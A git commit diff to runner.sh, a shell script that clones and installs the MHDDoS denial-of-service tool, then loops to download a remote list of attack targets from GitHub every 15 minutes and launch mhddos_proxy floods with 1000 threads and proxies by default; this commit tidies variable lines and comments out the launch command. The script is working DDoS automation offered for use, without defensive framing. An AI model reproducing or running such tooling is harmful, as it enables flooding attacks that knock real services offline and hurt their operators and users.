5c846d2f3c8c8a90945ffa540331108084f28700
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-22 12:34:52 +0200

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -14,17 +14,10 @@ sudo git clone https://github.com/MHProDev/MHDDoS.git
 sudo python3 -m pip install -r MHDDoS/requirements.txt
 cd ~
 
-threads="${1:-1000}"
-threads="-t $threads"
-
-rpc="${2:-50}"
-rpc="--rpc $rpc"
-
+threads="${1:-1000}"; threads="-t $threads"
+rpc="${2:-50}"; rpc="--rpc $rpc"
 restart_interval="${3:-900}"
-
-proxy_interval=3600
-proxy_interval="-p $proxy_interval"
-
+proxy_interval=3600; proxy_interval="-p $proxy_interval"
 debug="--debug"
 
 # Restart attacks and update targets list every 15 minutes (by default)
@@ -38,7 +31,7 @@ do
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
             echo -e $i": " "$cmd_line $proxy_interval $threads $rpc\n"
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $proxy_interval $rpc $debug&
+            #python3 ~/mhddos_proxy/runner.py $cmd_line $threads $proxy_interval $rpc $debug&
       done
 sleep $restart_interval
 done
